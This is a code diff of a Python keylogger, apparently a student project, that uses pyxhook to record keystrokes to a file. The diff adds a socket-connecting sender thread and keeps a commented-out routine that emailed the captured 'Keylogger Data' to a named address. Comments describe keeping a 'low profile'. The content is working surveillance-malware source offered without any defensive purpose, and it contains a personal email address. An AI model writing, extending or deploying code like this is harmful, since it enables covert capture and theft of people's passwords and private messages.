@@ -15,6 +15,7 @@ import pyxhook
 import time
 import threading
 import smtplib
+import socket
 
 running = True
 string = ""
@@ -28,6 +29,23 @@ class TimerClass(threading.Thread):
 
     def run(self):
         global running
+
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        hostname = socket.gethostname()
+        port = 35476
+        connection = (hostname, port)
+
+        while running:
+            try:
+                s.connect(connection)
+                print("connection established")
+                break
+            except:
+                pass
+
+        s.close()
+
+        """
         while not self.event.is_set() and running is False:
             with open("test.txt", 'r') as datafile:
                 data = datafile.read()
@@ -41,7 +59,7 @@ class TimerClass(threading.Thread):
                 TO = ["dxt9140@g.rit.edu"]
                 SUBJECT = "Keylogger Data"
                 MESSAGE = data
-
+         
                 try:
                     # Connect to the server and send the message
                     server = smtplib.SMTP()
@@ -53,24 +71,27 @@ class TimerClass(threading.Thread):
                     with open("test.txt", 'w') as clear_file:
                         clear_file.write("")
     
-                """
                 I don't think we should print things to the console. We want
                 a low profile. Remove?
-                """
+
                 @Todo
                 except Exception as e:
                     print(e)
 
             # Why wait?
             self.event.wait(1)
+        """
 
+    def cancel(self):
+        self.event.set()
 
 def keyDownEvent( event ):
     global running
     global string
+    global test_file
 
     if event.Ascii == 8:
-        string += "<BackSpace>"
+        string += "<bs>"
 
     # Only write printable characters
     elif event.Ascii >= 32:
@@ -78,23 +99,17 @@ def keyDownEvent( event ):
 
     # Esc ends the program
     if event.Ascii == 27:
-        file = open("test.txt", 'a')
-        file.write(string)
-        file.close()
-        string = ""
+        test_file.write(string)
         running = False
 
 
 def main():
     global running
+    global test_file
 
     # Clear the data file. Can be removed later once I actually want to
     # receive emails.
-    test_file = open("test.txt", "w")
-    test_file.write("")
-    test_file.close()
-
-    running = True
+    test_file = open("test.txt", "a")
 
     # Create PyxHook object
     keyboard_hook = pyxhook.HookManager()
@@ -108,20 +123,17 @@ def main():
     # Begin the keyboard hook thread
     keyboard_hook.start()
 
-    """
-    I disabled the actual thread for testing purposes. It's annoying to
-    receive a bunch of emails when I can just read the test.txt file.
-    """
-    # create timeClass object
-    # mail = TimerClass()
-    # start listening and sending mail
-    # mail.start()
+    # Create the thread that will send the data when the server connects
+    sender = TimerClass()
+    sender.start()
 
     while running:
-        time.sleep(0.1)
+        time.sleep(.01)
 
     # close thread
+    sender.cancel()
     keyboard_hook.cancel()
+    test_file.close()
 
 if __name__ == '__main__':
     main()
